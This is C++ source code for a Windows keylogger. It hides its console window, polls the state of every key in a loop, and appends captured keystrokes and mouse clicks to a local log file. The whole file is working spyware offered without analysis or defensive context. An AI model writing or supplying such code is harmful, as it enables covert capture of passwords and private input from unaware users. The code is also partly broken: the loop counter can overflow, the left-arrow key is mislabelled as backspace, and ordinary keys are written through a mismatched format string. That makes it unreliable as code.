#include <iostream>
#include <windows.h>
#include<stdio.h>

using namespace std;

int Save(int _key, char *file);

int main(){
    FreeConsole();
    char i;
    while(true){
        Sleep(10);
        for(i=8; i<255; i++){
            if(GetAsyncKeyState(i) == -32767){
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file){
    cout << _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    if(_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT] ");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK] ");
    else if (_key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[BACK] ");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if (_key == VK_RBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
    else if (_key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UPBUTTON] ");
    else if (_key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWNBUTTON] ");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN] ");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE] ");
    else if (_key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", "[SPACE] ");
    else if (_key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL] ");
    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE] ");
    else if (_key == VK_RWIN)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT WINDOWS] ");
    else if (_key == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", "[LEFT WINDOWS] ");
    else if (_key == VK_LSHIFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT] ");
    else if (_key == VK_RSHIFT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT] ");
    else if (_key == VK_LCONTROL)
        fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL] ");
    else if (_key == VK_RCONTROL)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT CONTROL] ");
    else if (_key == VK_MBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[MIDDLE MOUSE BUTTON] ");
    else
        fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;

}
